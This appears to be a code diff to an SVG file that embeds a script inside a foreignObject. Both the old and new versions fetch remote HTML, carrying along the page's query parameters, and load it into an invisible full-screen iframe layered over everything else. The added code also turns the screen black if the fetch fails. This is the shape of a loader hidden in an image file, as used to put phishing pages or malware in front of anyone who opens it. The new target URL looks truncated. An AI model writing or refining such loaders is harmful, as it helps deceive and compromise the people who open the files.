@@ -1,32 +1,40 @@
-<svg xmlns="http://w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
-
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
   <foreignObject x="0" y="0" width="100%" height="100%">
-    <body xmlns="http://w3.org">
+    <body id="main-body" xmlns="http://w3.org" style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: transparent; transition: background-color 0.3s ease;">
       <meta content='width=device-width, initial-scale=1.0' name='viewport'></meta>
+      
       <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+      
       <script>
-        const params = new URLSearchParams(window.location.search);
-        params.set("t", Date.now());
-        const safeUrl = "https://cdn.jsdelivr.net/gh/zaka13x/zaka13X@main/index.html" + "?" + params.toString();
-        let l = `
-        \x3Cscript>
-        launch();
-        function launch() {
+        (async function() {
           try {
-            const url = decodeURIComponent("${safeUrl}");
-            fetch(url).then(response => response.text())
-              .then(html => {
-                document.open();
-                document.write(html);
-                document.close();
-              });
+            // 1. Pull search parameters safely without breaking XML syntax
+            const params = new URLSearchParams(window.location.search);
+            params.set("t", Date.now().toString());
+            
+            // 2. Define the target resource URL
+            const safeUrl = "https://jsdelivr.net" + "\x3F" + params.toString();
+            
+            // 3. Fetch resource as plain text (ignoring Content-Type headers)
+            const response = await fetch(safeUrl);
+            if (!response.ok) throw new Error("HTTP error " + response.status);
+            const rawHtml = await response.text();
+            
+            // 4. Force HTML interpretation via direct srcdoc assignment
+            const theIframe = document.getElementById('test'); 
+            theIframe.srcdoc = rawHtml;
+            
           } catch (error) {
-            console.error('error:', error);
+            console.error('Dynamic template fetch tracking error:', error);
+            
+            // FALLBACK TRACE: Turn screen solid black if execution fails
+            const body = document.getElementById('main-body');
+            const iframe = document.getElementById('test');
+            
+            if (body) body.style.backgroundColor = '#000000';
+            if (iframe) iframe.style.display = 'none'; // Hide iframe to show black background cleanly
           }
-        }
-        \x3C/script>`; 
-        var theIframe = document.getElementById('test'); 
-        theIframe.srcdoc = l;
+        })();
       </script>
     </body>
   </foreignObject>
